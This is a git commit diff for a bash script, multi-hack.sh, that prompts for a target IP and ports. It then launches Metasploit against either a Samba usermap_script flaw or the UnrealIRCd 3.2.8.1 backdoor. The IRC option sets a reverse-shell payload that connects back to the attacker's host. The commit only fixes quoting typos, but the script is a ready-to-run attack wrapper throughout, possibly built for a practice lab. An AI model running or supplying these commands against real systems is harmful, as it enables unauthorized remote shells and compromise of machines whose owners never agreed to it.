50ebed4bd2f924fcad2bcc7f823fc8b5b5fc9e3a
Admin <admin@Admins-MacBook-Air.local>
2023-12-27 18:10:57 -0800

    fixing typos in script

--- bash/multi-hack.sh
+++ bash/multi-hack.sh
@@ -13,12 +13,11 @@ read lport
 echo "Enter Attack Port AKA RPORT: "
 read rport
 
-echo -n "Would you like to the Samba or IRC Exploit?... Enter 1 for Samba or 2 for IRC: "
+echo "Would you like to the Samba or IRC Exploit?... Enter 1 for Samba or 2 for IRC: "
 read VAR
 	if [[ $VAR = 1 ]]; then
-      		msfconsole -q -x "use exploit/multi/samba/usermap_script; set rhost $ip; set lport $lport; exploit;
+      		msfconsole -q -x "use exploit/multi/samba/usermap_script; set rhost $ip; set lport $lport; exploit";
 	fi
 	if [[ $VAR = 2 ]]; then
-      		msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set payload cmd/unix/reverse; set rhost $ip; set lhost $lhost; set lport $lport; exploit;
+      		msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set payload cmd/unix/reverse; set rhost $ip; set lhost $lhost; set lport $lport; exploit";
 	fi
-done
